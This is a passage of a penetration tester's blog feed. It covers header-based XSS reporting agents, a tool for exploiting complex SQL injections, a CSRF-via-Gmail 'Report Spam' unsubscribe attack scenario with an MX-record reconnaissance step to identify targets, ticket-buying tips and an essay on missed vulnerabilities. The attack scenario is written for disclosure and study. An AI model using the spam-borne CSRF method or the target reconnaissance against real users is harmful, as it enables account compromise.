&lt;div class=&quot;codehilite&quot;&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;X-XSS-Protection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;Content-Security-Policy-Report-Only&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;policy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;report-uri&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;://&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;honeybadger&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;api&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;beacon&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;guid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;Content-Security-Policy&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The &lt;code&gt;X-XSS-Protection&lt;/code&gt; header disables the browser-side XSS protection before the Content Security Policy is configured. This is because browser-side XSS protection will trigger before the Content Security Policy and prevent the agent from working.&lt;/p&gt;
&lt;p&gt;The XSS-Protection agent reports any time the built-in browser XSS protection mechanism triggers, which indicates the presence of a known XSS attack. The following header creates the XSS-Protection agent:&lt;/p&gt;
&lt;div class=&quot;codehilite&quot;&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;X-XSS-Protection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;report&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;://&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;honeybadger&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;api&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;beacon&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;guid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;XSS-Protection&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;These agents cannot be used together. Using them together will only allow the XSS-Protection agent to trigger, as described above. I recommend the Content-Security-Policy agent for any environment that already has it implemented, and the XSS-Protection agent for those that don't. However, be mindful that the headers these agents use are only supported by some browsers. To see the Content-Security-Policy agent in action, check out a target demo page on any deployed HoneyBadger instance.&lt;/p&gt;</content>
  </entry>
  <entry xml:base="https://www.lanmaster53.com/atom.xml">
    <title type="text">SQLi Exploiter: Exploiting Complex SQL Injections</title>
    <id>https://www.lanmaster53.com/2018/05/24/sqli-exploiter-exploiting-complex-sqli</id>
    <updated>2018-05-24T00:00:00Z</updated>
    <published>2018-05-24T00:00:00Z</published>
    <link href="https://www.lanmaster53.com/2018/05/24/sqli-exploiter-exploiting-complex-sqli" />
    <content type="html">&lt;p&gt;Raise your hand if you've ever had sqlmap fail to find or exploit a vulnerability you knew to exist? I imagine there's a lot of folks with their hands up right now. Okay, put your hands down.&lt;/p&gt;
&lt;!-- READMORE --&gt;

&lt;p&gt;I'll be the first person to tell you that sqlmap can almost always be tuned to discover a SQL injection vulnerability found through other means. I'll also be the first to recommend never using sqlmap to discover new SQL injection vulnerabilities. While discovering SQL injection vulnerabilities is not a strength of sqlmap, it is without a doubt the king of exploiting them. The trick is, sqlmap has to discover the vulnerability before it can exploit it. So if it can't discover it, it can't exploit it... you know where I'm going with this. The bottom line is, there is only so much you can do with command line switches and sometimes you run into edge cases where sqlmap just doesn't get it. Hence, the reason for this blog article.&lt;/p&gt;
&lt;p&gt;I was on a test recently where I discovered a timing-based blind injection vulnerability in an &lt;code&gt;ORDER BY&lt;/code&gt; clause that prevented the use of single quotes. I searched the vast sqlmap help file, explored the tamper scripts, and spent several hours trying to get sqlmap to discover the vulnerability I had found. The developer of sqlmap could probably have configured sqlmap to find it, but I could not. I can honestly say this was the first time this has happened to me. I've talked to many people that say it happens all the time, but I'd be willing to bet it was a result of them not knowing the sqlmap configuration options or the vulnerablity well enough to tell sqlmap how to find it. But I digress. Sqlmap wasn't doing it for me this time.&lt;/p&gt;
&lt;p&gt;So I decided to use Burp Intruder. If you've never done blind SQL injection enumeration with Intruder before, it's actualy quite fun. You create insertion points for each part of the query that needs to be enumerated, then you create the associated payload sets and run the attack. Sorting by various columns depending on the vulnerabilty will allow you to determine what was enumerated by the attack. The biggest problem with this approach is that Intruder isn't smart enough to stop enumerating when a successful character is enumerated from one of the payload sets. Therefore, it has to continue all of the other payloads in the set, which at this point we know are going to fail. When the vulnerability is timing-based, this can result in extended wait times. Also, it's extremely noisy from a monitoring perspective. In this case, the timing condition was any response that took longer than two seconds to respond. Start doing the math. Yeah.&lt;/p&gt;
&lt;p&gt;I've built my career on finding gaps and filling them. The space between Intruder and sqlmap with regards to exploiting complex SQL injections is space worth filling. So I built something.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/lanmaster53/sqli-exploiter&quot;&gt;https://github.com/lanmaster53/sqli-exploiter&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Be warned, this is not a script kiddie tool. Usage requires detailed knowledge of the vulnerability, a thorough understand of the functionality available in the affected RDBMS, and the ability to write Python. However, the good news is that it is highly configurable as a result. I can't imagine an injection scenario that it can't be configured to exploit. Give it a shot and let me know what you think.&lt;/p&gt;</content>
  </entry>
  <entry xml:base="https://www.lanmaster53.com/atom.xml">
    <title type="text">Report Spam. Get Owned.</title>
    <id>https://www.lanmaster53.com/2018/03/15/report-spam-get-owned</id>
    <updated>2018-03-15T00:00:00Z</updated>
    <published>2018-03-15T00:00:00Z</published>
    <link href="https://www.lanmaster53.com/2018/03/15/report-spam-get-owned" />
    <content type="html">&lt;p&gt;So, a couple weeks ago Matt Svensson (&lt;a href=&quot;https://twitter.com/TechNerdings&quot;&gt;@TechNerdings&lt;/a&gt;) dropped me a DM in Twitter:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Random other thing that I am curious if you guys have seen anything on... I just got an email from the local eye clinic.  I hit the &quot;spam&quot; button on Gmail to report spam and unsubscribe. What I didn't realize is that it actually opens the unsubscribe link in the browser. Good news, easy unsubscribe. Maybe.....if you properly craft the spam...you could use the unsubscribe button to open a malicious web page?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Um... yeah! I immediately thought of how great a CSRF-via-email attack vector this was. Think about it. Users are trained not to click links, but in the case of Gmail, they're taught to click the handy-dandy &quot;Report Spam&quot; button to report it to the spam filter. But wait a second. The handy-dandy &quot;Report Spam&quot; button will go the extra step and unsubscribe the user from future attacks as well if the user so desires... and they do.&lt;/p&gt;
&lt;!-- READMORE --&gt;

&lt;h3&gt;Scenario&lt;/h3&gt;
&lt;p&gt;An attacker crafts a spam message with an embedded &quot;unsubscribe&quot; link containing the CSRF attack payload like so:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/static/images/posts/2018-03-15-report-spam-get-owned/spam-unsubscribe.png&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;/static/images/posts/2018-03-15-report-spam-get-owned/spam-unsubscribe.png&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The attacker then sends the email to their victims. In the process of reporting suspicious links and unsubscribing from future messages, because it's the &quot;safe&quot; thing the victims were trained to do, Google clicks the link for the victims, and the CSRF attack payload is triggered from the victim's browser.&lt;/p&gt;
&lt;h3&gt;Further Study&lt;/h3&gt;
&lt;p&gt;Being a user of both Gmail and G Suite, I did some additional testing and noticed some other interesting behavior regarding the effectiveness of this attack across these platforms.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Gmail to G Suite worked as noted above.&lt;/li&gt;
&lt;li&gt;G Suite to Gmail resulted in a different message that did not have the option to mark as spam and unsubscribe and warned of possible danger.&lt;/li&gt;
&lt;li&gt;Gmail to Gmail worked as well.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Interesting. You'd think the stuff coming from Gmail would be the most suspicious because anyone could create a free Gmail account and use it for spam. But Google trusts the Gmail stuff where it warns of the G Suite stuff.&lt;/p&gt;
&lt;p&gt;While in theory I love this idea, it wasn't nearly as awesome in practice. After a little bit of fooling around, I couldn't get it to trigger in any of my accounts anymore. Gmail learned something about my attempts to replicate the attack and stopped asking about the spam when clicking the &quot;Report Spam&quot; button. Even after going into the spam folder and marking the message as &quot;Not Spam.&quot; I suspect when you report something as spam once, Gmail remembers and doesn't ask whether you want to unsubscribe or just filter the next time you click the &quot;Report Spam&quot; button. It just filters it.&lt;/p&gt;
&lt;h3&gt;Verifying Targets&lt;/h3&gt;
&lt;p&gt;Before this information is at all useful, an attacker must validate whether or not their target is using one of Google's email services. Detecting Gmail is easy. Just look for the &lt;code&gt;@gmail.com&lt;/code&gt; domain in the email address. Detecting G Suite isn't much harder. Do a MX record lookup for the email addresses domain (hostname actually) via DNS and examine the mail server addresses. Below is an example of using dig to conduct such a lookup for the &lt;code&gt;tim.tomes@practisec.com&lt;/code&gt; email address:&lt;/p&gt;
&lt;div class=&quot;codehilite&quot;&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ dig -t MX practisec.com +short
&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; aspmx.l.google.com.
&lt;span class=&quot;m&quot;&gt;5&lt;/span&gt; alt1.aspmx.l.google.com.
&lt;span class=&quot;m&quot;&gt;5&lt;/span&gt; alt2.aspmx.l.google.com.
&lt;span class=&quot;m&quot;&gt;10&lt;/span&gt; alt3.aspmx.l.google.com.
&lt;span class=&quot;m&quot;&gt;10&lt;/span&gt; alt4.aspmx.l.google.com.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;As you can see, it quickly becomes obvious who the target is using for a mail provider. Any domain other than &lt;code&gt;gmail.com&lt;/code&gt; using Google's mail servers is a G Suite user.&lt;/p&gt;
&lt;h3&gt;Responsible Disclosure&lt;/h3&gt;
&lt;p&gt;With Matt's permission, I went ahead and submitted the issue to Google as a security issue, knowing full well that it was a long shot. I mean, technically, the onus is on the user to understand their technology, but Google definitely makes it easier to exploit users through their platform, albeit to attack someone else's vulnerability. Google's response?&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Status: Won't Fix (Intended Behavior)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Thanks Google.&lt;/p&gt;
&lt;p&gt;If the bug is ever made public, it will be available &lt;a href=&quot;https://issuetracker.google.com/issues/74233153&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;</content>
  </entry>
  <entry xml:base="https://www.lanmaster53.com/atom.xml">
    <title type="text">Cooling Down the Hottest Ticket in Town</title>
    <id>https://www.lanmaster53.com/2017/08/26/cooling-down-the-hottest-ticket-in-town</id>
    <updated>2017-08-26T00:00:00Z</updated>
    <published>2017-08-26T00:00:00Z</published>
    <link href="https://www.lanmaster53.com/2017/08/26/cooling-down-the-hottest-ticket-in-town" />
    <content type="html">&lt;p&gt;We had an interesting conversation on the Proverbs Hackers mailing list today about getting tickets for popular conferences that have limited ticket sales. Security conferences most often thought of in this category are DerbyCon and ShmooCon. For anyone that has tried to get tickets to one of these conferences in the traditional fashion, you know the struggle is real. The conversation got me thinking about ways you can acquire a ticket that you may not realize are available. Below is the result of that thought exercise.&lt;/p&gt;
&lt;!-- READMORE --&gt;

&lt;ol&gt;
&lt;li&gt;Automate it. If you do go the traditional route, every second counts. Never more so than with DerbyCon, which has traditionally opened up ticket sales early. There was a lot of dialog on that this year as they sold out before they were actually supposed to go on sale. For conferences like DerbyCon, racing for a ticket upon release is the worst way to try and get a ticket. But if you insist, set up a &lt;code&gt;curl&lt;/code&gt; or &lt;code&gt;wget&lt;/code&gt; based heart beat script for the registration page and have it running 30 minutes before the scheduled start. This should give you the best chance of being one of the first to know when sales actually start. My wife and I did this for her Walker Stalker tickets this year and it worked great. Here's a one-liner to get you started: &lt;code&gt;while :; do ping -c 3 127.0.0.1 2&amp;gt;&amp;amp;1 &amp;gt;/dev/null; curl -s {purchase url} | grep &quot;{text unique to pre-sale condition}&quot; || say &quot;go go go&quot;; done&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Submit to the conference CFP. This has always been my approach. Places like ShmooCon have traditionally provided opportunities to buy tickets for every CFP submission. The system can be &quot;gamed&quot; a bit, but there is also always a chance that your CFP gets accepted, so be prepared to speak if you go this route.&lt;/li&gt;
&lt;li&gt;Buy second hand. This has traditionally been the best way to get a ticket for these conferences. I usually just keep an eye on Twitter. Especially, the day the conference sends CFP acceptance letters. This is the day that the accepted folks off-load the ticket they bought as a back up plan.&lt;/li&gt;
&lt;li&gt;Pay an accepted speaker their honorarium in exchange for the extra ticket they get offered. Many conferences offer an honorarium OR a second free ticket to the conference for accepted CFP submissions. Get in touch with someone whose CFP submission was accepted and offer to pay their honorarium in exchange for a ticket. Then, they can choose the extra ticket over the honorarium as their &quot;gift&quot; and sell it to you on site. This might cost a little more, as honorariums are typically more than the ticket price, but usually not by much.&lt;/li&gt;
&lt;li&gt;Go to training. Most conferences include access to the seminars with a training ticket. This is the most expensive way, but you get the most too.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;So, perhaps this will open a door for someone that really wants to get a ticket to a conference, but thought they were out of options. If you happen to use one of these techniques and it works, I'd love to hear your success story. Good luck, and happy hunting. It's officially conference season.&lt;/p&gt;</content>
  </entry>
  <entry xml:base="https://www.lanmaster53.com/atom.xml">
    <title type="text">Handling Missed Vulnerabilities</title>
    <id>https://www.lanmaster53.com/2017/04/05/handling-missed-vulnerabilities</id>
    <updated>2017-04-05T00:00:00Z</updated>
    <published>2017-04-05T00:00:00Z</published>
    <link href="https://www.lanmaster53.com/2017/04/05/handling-missed-vulnerabilities" />
    <content type="html">&lt;p&gt;(Originally posted at &lt;a href=&quot;https://nvisium.com/blog/2017/04/05/handling-missed-vulnerabilities/&quot;&gt;https://nvisium.com/blog/2017/04/05/handling-missed-vulnerabilities/&lt;/a&gt;.)&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://twitter.com/digininja&quot;&gt;Robin &quot;digininja&quot; Wood&lt;/a&gt; wrote &lt;a href=&quot;https://digi.ninja/blog/missing_a_vuln.php&quot;&gt;this&lt;/a&gt; interesting article about the impact of missing vulnerabilities during security assessments. He makes a lot of good points, and the reality is, it's something we all deal with. Robin talks about how missing a vulnerability can be the end of one's career, or at least a large step backward. While this is true, his article only addresses the impact at a micro level. I'd like to expand on that.&lt;/p&gt;
&lt;!-- READMORE --&gt;

&lt;p&gt;As the Managing Consultant of a growing Application Security Consulting practice, this issue takes on a much larger form. We are no longer talking about one person's career. We are talking about an entire organization on whom employees' livelihood rely. Missing a vulnerability at this level can have some major consequences that affect a lot more than the offending consultant.&lt;/p&gt;
&lt;p&gt;But it's going to happen. It's not a matter of if, but when. So it's important to be prepared when something like this does happen. As someone that has put a good bit of thought into this issue due to my position at nVisium, I've compiled my thoughts on the issue from prevention to reaction. These thoughts cover various hypothetical examples, attempt to identify the root problem, and discuss solutions to help rectify the situation.&lt;/p&gt;
&lt;h3&gt;Scenarios&lt;/h3&gt;
&lt;p&gt;The most probable scenario that could lead to missed vulnerabilities is retesting an application that the same consultancy has tested previously. Most good consultancies understand that there is value in rotating consultants for portfolio clients, but there is also risk. No two consultants are the same. Strengths, weaknesses, techniques, and tool sets vary, and with that, the results of their respective assessments. While those that employ this technique see this as a benefit to the client, if the consultant that tested most recently finds something that existed for a previous test but was overlooked, the client is more than likely not going to be thrilled about it, especially if it was something simple. The spectrum of response here is large as there is a significant difference between missing something during a black box assessment that gets picked up by an SCA tool vs. missing something via black box assessment that results in a major breach, but none of the possible outcomes are desireable. This is the scenario that most often leads to the uncomfortable discussion of the client attempting to govern which consultant is allowed to work on their assessments moving forward. I've heard stories of this going as far as direct threats to end all future work unless the consultant was terminated from employment. I can't imagine this is a comfortable position to be in.&lt;/p&gt;
&lt;p&gt;While not the most common, the most damaging scenario is when the security assessment is the first step in the implementation of a bug bounty program. If you think it is bad having one of your own consultants find something that another one of your consultants missed, imagine a client having to pay a bug bounty for a vanilla vulnerability that one of your consultants missed. These are resume generating events.&lt;/p&gt;
&lt;h3&gt;Framing the Problem&lt;/h3&gt;
&lt;p&gt;There are four main reasons for encountering these scenarios and others like them: time, effort, aptitude, and methodology. The TEAM acronym was a complete accident, but works out pretty darn perfectly.&lt;/p&gt;
&lt;h4&gt;Time&lt;/h4&gt;
&lt;p&gt;Time is the thing that most restricts security assessments, and is the biggest difference between testers and the threats they attempt to replicate. In most cases, testers don't have the same amount of time as the threat, so time becomes a variable that is considered with varying levels of information in an attempt to most accurately represent the threat in a reduced period of time. Let's face it. No one wants to pay enough to truly replicate the threat.&lt;/p&gt;
&lt;p&gt;All of these variables come into play during a process called scoping. Scoping is an extremely important part of the assessment planning process, as it is a key component to providing consultants with enough time to complete an engagement. If a conslultant is given too little time, then corners are cut, full coverage is not achieved, and we've introduced an opportunity for inconsistency.&lt;/p&gt;
&lt;p&gt;There are a lot of things to consider when scoping.&lt;/p&gt;
&lt;p&gt;Higher level assets (senior consultants, etc.) are faster than lower level assets (junior consultants, etc.). Low level assets will have to conduct more research on tested components, tools, etc. in order to sufficiently do the job. In fact, so much of what testers do at every level is largely on-the-job self-training. I don't know about you, but I hire based on a candidate's capacity to learn over what they already know. However, there is always a learning curve that must be considered when scoping an engagement in order to ensure full coverage.&lt;/p&gt;
&lt;p&gt;Threat replication is a different kind of test than bug hunting. Depending on what kind of consulting the tester specializes in, they're either threat focused, or vulnerablity focused. To be vulnerablity focused is to focus on finding every possible vulnerability in a target. To be threat focused is to focus on replicating a very specific threat and only try to find what is needed to accomplish the determined goal of the replicated threat. The focus obviously has a huge impact on the amount of time required to complete the engagement, and the accuracy at which one can scope the engagement. When focusing on bugs, there are static metrics that can be analyzed to determine the size of the target: lines of code, dynamic pages, APIs, etc. Threat focused testing is much more subjective, as until you encounter something that gets you to the next level, you don't know how long it's going to take to get there.&lt;/p&gt;
&lt;p&gt;Budget is often the most important factor in scoping, even though in many cases it is an unknown to the person doing the scoping. Quite often, a client's eyes are bigger than their wallet, and once they get a quote, they begin discussing ways to reduce the price of the engagement. While this is perfectly fine, and most of us would do it if we were in their shoes as well, consultancies have to be very careful not to obligate themselves to a full coverage assessment in a time frame that is unrealistic.&lt;/p&gt;
&lt;p&gt;When cost isn't the determining factor that leads to over-obligation, it's client deadlines. You want to help your client, but they need it done by next week and it's easily a three week engagement. Be careful of this pitfall. There are solutions to helping the client without introducing opportunities for inconsistency. Keep reading.&lt;/p&gt;
&lt;p&gt;The bottom line is, the consultant performing the engagement must have enough time to complete it in accordance with the terms of the contract. If the contract says &quot;best effort&quot;, then pretty much any level of completion meets the standard. Otherwise, the expectation is full coverage for the identified components. Without enough time, you can be sure some other consultant, internal or extenal, is going to eventually follow up with a full coverage assessment that find something the previous consultant missed.&lt;/p&gt;
&lt;p&gt;Addressing the &quot;time&quot; problem begins with refining the scoping process. This requires good feedback from consultants and tracking. Consultancies need to know when something is underscoped, overscoped, and why, and the only way to do this is to gather metrics about the timing of engagements from raw data sources, and from the consultants doing the work. When client budget is affecting the scope, consider recommending a &quot;best effort&quot; engagement, or an assessment that focuses on the specific components that are most important to the client. If a client has a hard deadline, consider leveraging more resources over a shorter period of time in order to meet their goal. There are always options, but the bottom line is to prevent the possibility of inconsistencies by making sure consultants have adequate time to meet contract requirments.&lt;/p&gt;
&lt;h4&gt;Effort&lt;/h4&gt;
&lt;p&gt;Effort is a personal responsibility. If a consultant doesn't put in the expected quantity of work to complete the job as scoped, but bills for the same, then not only will this introduce the opportunity for inconsistency, but the consultant is essentially stealing from the client on behalf of the consultancy. This is a serious offense with no easy solution. So much of what indicates a person's sustained level of effort comes from maturity and work ethic. Identifying these is something consultancies should do during the candidacy stage of the employment process.&lt;/p&gt;
&lt;p&gt;Another aspect of effort is how consultants approach deliverables. It's no secret. Most consultants don't enjoy writing deliverables. Regardless, deliverables are the one thing left with the client when the consultant finishes an engagement. It provides the lasting impression that the client will have of the consultant, and more importantly, the consultancy. However, every so often consultants take shortcuts to reduce the time it takes to create a deliverable. This always leads to lower quality product and opportunities for inconsistency. Consultants must assume that the next consultant to see this target is going to put the requisite effort into the deliverable. The bottom line is, report everything. Whether the consultant uses paragraphs, bullets, or tables, if they discovered 30 instances of XSS, they need to report all 30 of them in the deliverable. They shouldn't just say, &quot;We determined this to be systemic, so fix everywhere.&quot; This is poor quality consulting. It's ok to say things are systemic and that there may be other instances not found for one reason or another, but if the consultant found 30 instances, they need to pass that information to the client. They paid for it. Another common deliverable shortcut is grouping vulnerabilities by type without proper delineation. User Enumeration in a login page is very different from User Enumeration in a registration page, and recommendations for how to remediate these issues are completely different. If a consultant lumps all instances of User Enumeration into one issue and doesn't clearly delineate between the specific issues, then the consultant isn't putting in the required level of effort to prevent inconsistencies with future engagements.&lt;/p&gt;
&lt;p&gt;Effort isn't an issue that can be addressed through administrative or technical controls. Effort comes from who someone is, their work ethic, and their level of passion toward the task at hand. Unfortunately, passion and work ethic isn't something that can be taught at this point in life, and if this is the issue, then the only option may be parting ways. This is why it is important to have a good vetting process for employment candidates to ensure that candidates exhibit the qualities indicative of someone who will provide the level of effort desired.&lt;/p&gt;
&lt;h4&gt;Aptitude&lt;/h4&gt;
&lt;p&gt;A lack of aptitude is often mistaken for a lack of effort. The reality is that some people are just more gifted than others, and all consultants can't be held to the same standard. While certainly not always the case, skill level is quite often related to the quantity of experience in the field. It's why we have Junior, Mid-level, Senior, and Principal level consultants. As mentioned previously, a Junior consultant cannot be expected to accomplish as much as a Senior consultant in the same amount of time. The Junior will require more time to research the target components, tools, techniques, etc. required to successfully complete the engagement. While this is a scoping consideration, it's also a staffing consideration. There is a higher margin on low level consultants. They cost less per hour, so they are more profitable on an hourly basis when the rate charged to the client is the same as a consultant senior to them. A stable of capable Junior consultants can be quite profitable, but can also introduce inconsistency.&lt;/p&gt;
&lt;p&gt;Depending on the consultancy's strategic vision, there are a couple of approaches to solving the issue of aptitude. Many consultancies will try to avoid the issue all together by employing nothing but Senior level consultants or above. This is typical in small organizations with a high operational tempo and not enough resources to develop Junior consultants. These consultancies are basically throwing money at the problem. Their margin will be much lower, but they'll be able to maintain a higher operational tempo and incur less risk to testing inconsistencies related to skill. Another approach is a program to develop Junior consultants in an effort to increase margin and reduce the risk to testing inconsistencies over time. A great way to approach Junior consultant development is by pairing them up with consultants senior to them on every engagement. That way, they'll have constant leadership and someone they can lean on for mentorship on a constant basis. This allows the consultancy to get through engagements in a shorter time span due to having multiple assets assigned, but the scope of the project should consider the learning curve of the Junior consultant. In many cases, the increased speed of the senior asset will counter the slower speed of the junior asset, reducing the impact on the scoping process.&lt;/p&gt;
&lt;p&gt;Regardless of the approach, consultancies should empower their consultants to cross train and knowledge share on a constant basis. Something we've done at nVisium is to conduct bi-monthly lunch-and-learns. These are informal presentations of something related to the field from one consultant to the rest of the team. This serves two purposes. For senior consultants, it is an opportunity to share something new or unknown to junior level consultants. For junior consultants, it is an opportunity to professionally develop on a consistent basis, as each consultant rotates through. An added benefit for juniors is that there are few things that motivate someone to become a subject matter expert on a topic more than committing to presenting on that topic to a group of their peers. It is surprisingly affective, and the reason I write articles and present at conferences to this day.&lt;/p&gt;
&lt;p&gt;Another thing we do at nVisium is cultivate a highly collaborative environment via tools like Slack. So much so, that rarely does it feel like consultants are working on engagements alone. It is quite common to see code snippets and theory being tossed around and more than a handful of people sharing ideas about something encountered on an app only one of them is assigned to. This hive mind approach is not only highly affective in finding the best way forward for specific issues, but provides a great opportunity for Junior consultants to ask questions, receive clarification, and learn from their peers. It also attacks consistency at it's core as these events usually result in a public determination of where the organization stands on the issue and becomes an established standard moving forward. Everyone is involved, so everyone is aware.&lt;/p&gt;
&lt;h4&gt;Methodology&lt;/h4&gt;
&lt;p&gt;This is where I see consultants at all levels mess up more than anywhere else. Everyone thinks they're too good for methodology until someone else finds something new while following the methodology on the same application. The testing methodologies we use in Information Security today are proven. They work by laying the framework to maximize the time given to accomplish the task while providing a baseline level of analysis. I've seen consultants blow off methodology and one of two things happens: they spend all their time chasing phantom vulnerabilities (also known as &quot;rabbit holes&quot; and &quot;red herrings&quot;) and fail to make full coverage, or think they have full coverage only to realize they missed multiple vanilla vulnerabilites when someone else tested the same target at a later time. In either case, an opportunity for inconsistency is introduced because it's is not a matter of if someone will follow with proper methodology, it's a matter of when.&lt;/p&gt;
&lt;p&gt;Addressing this is about finding a balance between controlling the assessment process and allowing testers to exercise creative freedom. I am a firm believer in not forcing consultants to test in a confined environment by requiring them to use a checklist. Many of today's most critical vulnerabilities exist in business logic. Discovering vulnerabilities in how the application enforces logical controls to business processes requires a creative approach. Forcing consultants to use a checklist robs them of their creativity, reducing the likelihood of them actually testing outside of the items on the checklist. Since logic vulnerabilities are specific to the business process, they can't be checklist items. So while checklist testing is a good way to ensure a higher level of consistency, it leads to a consistent product lacking quality and completeness.&lt;/p&gt;
&lt;p&gt;At nVisium we've developed what we call a &quot;testing guide.&quot; What makes our guide different from a checklist is that the guide is merely a series of questions about the application. How testers answer the questions is up to them. They can use their own techniques and their own tool set. The idea is that through answering each of the questions within the guide, the tester will have exercised the application in its entirety and maximized the likelihood of identiying all vulnerabilities. Including business logic flaws. This guide is not a deliverable, and it's not something that supervisors check for. It's a tool at the disposal of the consultant, and each consultant knows that the others are using it, so the system is self-policing.&lt;/p&gt;
&lt;h3&gt;The Inevitable&lt;/h3&gt;
&lt;p&gt;Even with all of this in place, someone is going to miss something. And when they do, the organization must conduct damage control. Damage control measures are largely going determined by how the client reacts to the issue. It is purely reactionary at this point by all parties. However, thinking through possible scenarios as a staff and &quot;wargaming&quot; these situations will better prepare the team for the inevitable.&lt;/p&gt;
&lt;p&gt;I'm a firm believe in owning your mistakes. I have way more respect for people that make mistakes and own them, than I do for folks that claim they never make any mistakes. Do you know what you call someone that never seems to be at fault for anything because they don't make mistakes? Dishonest. These individuals and the organizations they represent are immediately tagged as untrustworthy. We're in an industry where trust is the cornerstone of everything we do. Our clients entrust us with their intellectual property; the heart and soul of their businesses. Their livelihood. If we can't be trusted, we won't stay in business very long. Organizations and individuals alike must own their mistakes.&lt;/p&gt;
&lt;p&gt;After owning the mistake, the organization needs to make it right. Once again, this depends on what the issue is, but remember that the issue is not in a vacuum. So someone missed a small issue during a small assessment for a small client. One might feel inclined to let it go. Don't forget that our industry is small, and word travels fast. There's far too much risk in not doing the right thing here folks.&lt;/p&gt;
&lt;p&gt;The organization must accept the fact that sometimes making it right won't be enough. Clients pay consultancies a lot of money and expect a quality product. If the consultancy fails to deliver, the client has every right to find someone else that will, and the consultancy shouldn't be surprised if they do. In a perfect world, clients would understand our line of work and the difficulty in ensuring 100% consistency, but you don't need me to tell you this isn't a perfect world.&lt;/p&gt;
&lt;h3&gt;Wrapping Up&lt;/h3&gt;
&lt;p&gt;So it's going to happen, and someone is going to be dealing with the fallout. Chances are it won't be comfortable, but if the organization has implemented controls to reduce the frequency, and prepared themselves for occassions where the controls fail, they'll be equipped and prepared to limit the damage and ultimately live to test another day.&lt;/p&gt;</content>
  </entry>
  <entry xml:base="https://www.lanmaster53.com/atom.xml">
    <title type="text">Proxying thru Virtual Client VPNs</title>
    <id>https://www.lanmaster53.com/2016/12/01/proxying-thru-virtual-client-vpns</id>
    <updated>2016-12-01T00:00:00Z</updated>
    <published>2016-12-01T00:00:00Z</published>
    <link href="https://www.lanmaster53.com/2016/12/01/proxying-thru-virtual-client-vpns" />
    <content type="html">&lt;p&gt;So, I'm sorta OCD. Anyone that knows me will attest to that. When it comes to my computing environments, I can't stand clutter. That includes both the external and internal components of my computing environment. One particular point of interest for me is the number of applications installed on my system. I've always felt like limiting the amount of software on my system to only what I needed, and avoiding endless install and uninstall cycles, has resulted in a more stable system. I have no scientific proof to back this up, but it's always worked for me, so I like to keep my system clean and tidy. However, in my line of work, where one-off tools for testing and research abound, this is a daily challenge.&lt;/p&gt;
&lt;!-- READMORE --&gt;

